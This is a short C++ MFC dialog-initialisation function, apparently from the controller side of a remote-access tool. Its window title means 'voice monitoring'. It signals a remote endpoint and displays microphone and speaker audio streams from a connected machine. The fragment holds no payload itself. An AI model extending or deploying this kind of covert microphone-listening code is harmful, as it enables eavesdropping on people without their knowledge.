BOOL CAudioDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon

    CString str;
    str.Format("\\\\%s - 语音监听", m_IPAddress);
    SetWindowText(str);

    // 通知远程控制端对话框已经打开
    BYTE bToken = COMMAND_NEXT;
    m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

    m_hEventWaveIn	= CreateEventA(NULL, false, false, NULL);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

    g_WaveOut.StartPlay();  //开启语音播放

    filter.MiInit(m_Micdatacurve.GetSafeHwnd(),16);   //话筒画线初始化
    filter.HoInit(m_Horndatacurve.GetSafeHwnd(),16);  //喇叭画线初始化

    m_HoMiEven = CreateEventA(NULL, false, false, NULL);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HoMiThread, (LPVOID)this, 0, NULL);   //开启线程 显示波形
    return true;
}